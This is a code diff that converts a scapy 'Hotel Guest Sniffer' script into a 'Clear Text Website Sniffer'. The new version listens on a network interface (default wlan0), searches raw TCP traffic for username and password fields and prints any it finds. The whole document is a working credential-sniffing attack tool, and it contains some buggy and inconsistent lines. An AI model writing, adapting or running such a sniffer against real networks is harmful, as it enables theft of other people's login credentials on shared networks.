@@ -5,16 +5,16 @@
 import optparse
 from scapy.all import *
 
-def findGuest(pkt):
+def findCredentials(pkt):
   	raw = pkt.sprintf('%Raw.load%')
  	Username = re.findall('(?i)username=(.*)&', raw)
   	Password = re.findall("(?i)password=(.*)'", raw)
-  if name:
-    	print '[Success] Found Hotel Guest ' + str(name[0]) + ', Room #' + str(room[0])
+	if Username:
+    		print '\n\t[Success] Found Login User ' + str(Username[0]) + ', Password: ' + str(Password[0])
 
 def main():
-	parser = optparse.OptionParser('Uses Of Program -i <Interface>')
-	parser.add_option('-i', dest='interface', type='string', help='Specify Interface To Listen On')
+	parser = optparse.OptionParser('Uses Of Program: -i <Interface>')
+	parser.add_option('-i', dest='interface', type='string', help='Specify Interface To Listen On', default='wlan0')
 	(options, args) = parser.parse_args()
 	if options.interface == None:
 		printparser.usage
@@ -22,8 +22,8 @@ def main():
 	else:
 		conf.iface = options.interface
 	try:
-		print '[*] Starting Hotel Guest Sniffer'
-		sniff(filter='tcp', prn=findGuest=, store=0)
+		print '\n\n\t[Starting] Starting Clear Text Website Sniffer'
+		sniff(filter='tcp', prn=findCredentials, store=0)
 	except KeyboardInterrupt:
 		exit(0)
 	
